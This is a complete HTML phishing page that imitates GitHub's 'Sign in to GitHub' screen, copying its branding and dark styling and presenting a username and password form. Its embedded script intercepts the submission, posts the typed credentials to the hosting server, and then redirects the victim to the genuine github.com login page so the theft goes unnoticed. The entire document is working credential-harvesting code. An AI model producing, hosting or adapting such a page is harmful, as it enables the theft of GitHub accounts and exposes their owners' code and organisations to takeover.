<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Sign in to GitHub</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;background:#0d1117;display:flex;justify-content:center;align-items:center;min-height:100vh}.box{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:24px;width:340px;text-align:center}.logo{margin-bottom:24px;color:white;font-size:32px}.title{color:#e6edf3;font-size:24px;font-weight:300;margin-bottom:8px}input{width:100%;padding:8px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#e6edf3;font-size:14px;margin-bottom:16px;outline:none}input:focus{border-color:#58a6ff}input[type="submit"]{background:#238636;color:white;border:1px solid #2ea043;font-weight:500;cursor:pointer}.link{color:#58a6ff;text-decoration:none;font-size:12px}</style></head><body><div class="box"><div class="logo">GitHub</div><div class="title">Sign in to GitHub</div><form method="POST"><input type="text"name="login"placeholder="Username or email address"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Sign in"></form><a href="#"class="link">Forgot password?</a></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://github.com/login';});});</script></body></html>
